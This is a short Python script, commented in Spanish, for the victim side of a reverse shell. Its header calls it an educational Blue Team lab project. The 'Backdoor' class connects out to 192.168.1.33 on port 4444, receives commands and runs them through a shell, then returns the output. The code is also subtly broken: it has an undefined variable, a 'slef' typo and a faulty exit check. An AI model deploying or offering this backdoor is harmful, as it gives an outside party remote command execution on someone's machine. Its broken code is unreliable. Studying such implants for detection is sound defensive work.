#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# COMPATIBILIDAD: Windows + Linux
# =============================================================================


import socket, subprocess, sys, json # │ IMPORTACIÓN DE LIBRERÍAS

class Backdoor:
    
    def __init__(self,ip,port):
        
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # │ CREACIÓN DEL SOCKET
        self.connection.connect((ip,port)) # │ CONEXIÓN SALIENTE - PUNTO DE DETECCIÓN #1 ⚠️

    def ejecutarComando(self, command): # │ FUNCIÓN DE EJECUCIÓN DE COMANDOS - COMPATIBLE WINDOWS/LINUX

        return subprocess.check_output(command_str, shell=True)

    def run(self):

        while True: # │ BUCLE PRINCIPAL - ESPERA DE COMANDOS
            
            command = self.reliable_receive()

            if command[0]=="salir":
                self.connection.close()
                exit()
            resultadosComando = slef.ejecutarComando(command)
            self.reliable_send(resultadosComando)
                
    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data=""
        while True:
            try:
                json_data = self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue
                    

puerta = Backdoor("192.168.1.33", 4444)
puerta.run()